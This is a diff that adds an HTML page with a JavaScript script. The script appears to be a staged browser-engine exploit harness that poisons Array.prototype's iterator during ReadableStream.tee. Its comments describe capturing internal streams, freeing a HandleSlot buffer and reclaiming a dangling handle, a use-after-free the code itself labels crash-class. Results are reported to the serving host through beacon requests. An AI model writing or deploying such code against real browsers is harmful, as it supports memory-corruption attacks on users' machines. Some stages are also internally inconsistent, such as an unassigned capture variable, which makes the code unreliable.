@@ -1,0 +1,124 @@
+<!doctype html><html><head><meta charset="utf-8"><meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+<title>ESC1-A — grow-window + reclaim (D SH-ESC1 design, sync beacons, S6 crash-class single-shot LAST)</title></head>
+<body><pre id="out">ESC1-A running…</pre>
+<script>
+(function(){
+"use strict";
+var RID = "esc" + Date.now().toString(36).slice(-15);
+var out = document.getElementById("out");
+function say(s){ try{ out.appendChild(document.createTextNode("\n"+s)); }catch(e){} }
+function bks(st, body){ try{ var x=new XMLHttpRequest(); x.open("POST","/beacon/E1-"+st,false);
+  x.setRequestHeader("Content-Type","application/json");
+  x.send(JSON.stringify({r:RID, b:String(body).slice(0,230)})); }catch(e){} }
+function ba(st, body){ try{ fetch("/beacon/E1-"+st, { method:"POST", cache:"no-store",
+  headers:{"Content-Type":"application/json"},
+  body: JSON.stringify({r:RID, b:String(body).slice(0,230)}) }).catch(function(){}); }catch(e){} }
+var OI = Array.prototype[Symbol.iterator];
+function restore(){ try{ Array.prototype[Symbol.iterator] = OI; }catch(e){} }
+function tee(){ var rs = new ReadableStream({}); return rs.tee(); }
+function gs(stage, run){                /* fila de sincronía: A-*, work, B-*, siempre restore */
+  var r = "E-TASK";
+  try{ Array.prototype[Symbol.iterator] = OI; r = run(); }catch(e){ r = "ETYPE:" + String((e&&e.message)||e).slice(0,80); }
+  finally{ restore(); }
+  bks(stage, String(r).slice(0,220));
+  return r;
+}
+try{ ba("L", "loaded esc1-a; ua=" + navigator.userAgent.slice(0,40)); }catch(e){}
+try{ setInterval(function(){ ba("HB","hb"); }, 2000); }catch(e){}
+try{ document.__BOOT = Date.now(); }catch(e){ say("boot"); }
+
+/* S0 CTL+CAP — captura this[0]/this[1] = los internal-streams crudos del engine */
+gs("S0", function(){
+  var CAP = null;
+  var poi = function(){ var cap = this; var i=0, n=2;
+    return { next: function(){ if (i>=n) return {done:true}; var v = cap[i]; i++;
+      return { value: v, done: false }; } }; };
+  try{ Array.prototype[Symbol.iterator] = poi; }catch(e){}
+  var p = tee();
+  restore();
+  return "ctl=1; c0=" + typeof CAP[0] + "; c1=" + typeof CAP[1] + "; same=" + (CAP[0] === CAP[1]);
+});
+
+/* S1 INV+FROZEN — pidInverted baseline limpio (X solo ourTag) */
+gs("S1", function(){
+  var X = { ourTag: "esc1" }; window.__X = X;
+  var poi = function(){ var i=0, n=2; return { next: function(){ if (i>=n) return {done:true}; var v = X; i++;
+    return { value: v, done: false }; } }; };
+  try{ Array.prototype[Symbol.iterator] = poi; }catch(e){}
+  var p = tee();
+  restore();
+  var f=false, s=false, gr="-", tg="-";
+  try{ p[0].cancel(); }catch(e){ f=true; }
+  try{ p[1].cancel(); }catch(e){ s=true; }
+  try{ p[0].getReader(); gr="ok"; }catch(e){ gr="E:" + String((e&&e.message)||e).slice(0,30); }
+  try{ p[0].tee; tg=typeof p[0].tee; }catch(e2){}
+  return "flip=" + (f && !s) + "; t0=" + typeof p[0] + "; gr=" + gr + "; tee=" + tg;
+});
+
+/* S2 PUBWRITE — new ReadableStreamDefaultReader(p0): write-trusted vía API pública */
+gs("S2", function(){
+  var rs = new ReadableStream({}); var p0 = rs.tee ? rs : rs;   /* el wrapper */
+  var has = typeof window.ReadableStreamDefaultReader;
+  if (has !== "function") return "skip-rdr=" + has;
+  var rd = new window.ReadableStreamDefaultReader(p0);
+  var l1 = String(p0.locked).slice(0,5);
+  var rel1 = "-", rel2 = "-";
+  try{ rd.releaseLock(); rel1 = "ok"; }catch(e){ rel1 = "E:" + String((e&&e.message)||e).slice(0,30); }
+  var l2 = String(p0.locked).slice(0,5);
+  return "rdr=" + has + "; locked-after-ctor=" + l1 + "; release=" + rel1 + "; locked-after-rel=" + l2;
+});
+
+/* S3 CAP-BRAND — el guard sobre el internal-stream crudo capturado en S0 */
+gs("S3", function(){
+  var rs = new ReadableStream({}); var p = null; var CAP = null;
+  var poi = function(){ var cap = this; CAP = [cap[0], cap[1]]; var i=0, n=2;
+    return { next: function(){ if (i>=n) return {done:true}; var v = cap[i]; i++;
+      return { value: v, done: false }; } }; };
+  try{ Array.prototype[Symbol.iterator] = poi; }catch(e){}
+  p = tee();
+  restore();
+  var m = "-";
+  try{ var rd2 = new window.ReadableStreamDefaultReader(CAP[0]); m = "locked-msg-ok? l=" + String(rs.locked).slice(0,5); rd2.releaseLock(); }
+  catch(e){ m = "MSG:[" + String((e&&e.message)||e).slice(0,60) + "]"; }
+  return "brand=" + m;
+});
+
+/* S4 GROW17 — 20 yields con X en índices 0 y 1: expandCapacity libera el buffer class-128 con 16 HandleSlots INTACTOS */
+gs("S4", function(){
+  var X = window.__X; if (!X) { X = { ourTag: "esc1g" }; window.__X = X; }
+  var vals = [X, X, X, X];                      /* índices 0..19; X en 0 y 1 (resto rellenos para mantener el grow) */
+  var poi = function(){ var i=0, n=20;
+    return { next: function(){ if (i>=n) return {done:true}; var v = vals[i] || X; i++;
+      return { value: v, done: false }; } }; };
+  try{ Array.prototype[Symbol.iterator] = poi; }catch(e){}
+  var p = tee();
+  restore();
+  return "n=20 ok=1; p=" + p.length + "; alive=1";
+});
+
+/* S5 SINK — cero allocs relevantes; mantener X vivo */
+gs("S5", function(){
+  window.__X = window.__X || { ourTag: "esc1sink" };
+  return "sink=1; Xalive=" + String(window.__X !== null && typeof window.__X === "object").slice(0,5);
+});
+
+/* S6 RECLAIM — ⚠ CRASH-CLASS single-shot, ÚLTIMO. poison de 1 yield: results[1] = HandleSlot colgante */
+gs("S6", function(){
+  var X = window.__X;
+  var poi = function(){ var i=0, n=1;
+    return { next: function(){ if (i>=n) return {done:true}; var v = X; i++;
+      return { value: v, done: false }; } }; };
+  try{ Array.prototype[Symbol.iterator] = poi; }catch(e){}
+  var pA = tee();
+  restore();
+  var a = typeof pA[1], l = "-", as = "-";
+  try{ l = String(pA[1].locked).slice(0,8); }catch(e){ l = "E:" + String((e&&e.message)||e).slice(0,40); }
+  try{ if (window.ReadableStreamDefaultReader){ var r3 = new window.ReadableStreamDefaultReader(pA[1]); as = "ctor-ok";
+         try{ r3.releaseLock(); as += "-rel-ok"; }catch(e2){ as += "-rel-E"; } } }catch(e){ as = "ctor-E:" + String((e&&e.message)||e).slice(0,40); }
+  return "n=" + pA.length + "; a=" + a + "; l=" + l + "; asym=" + as;
+});
+
+ba("Z", "ESC1-A complete");
+say("ESC1-A complete");
+})();
+</script></body></html>
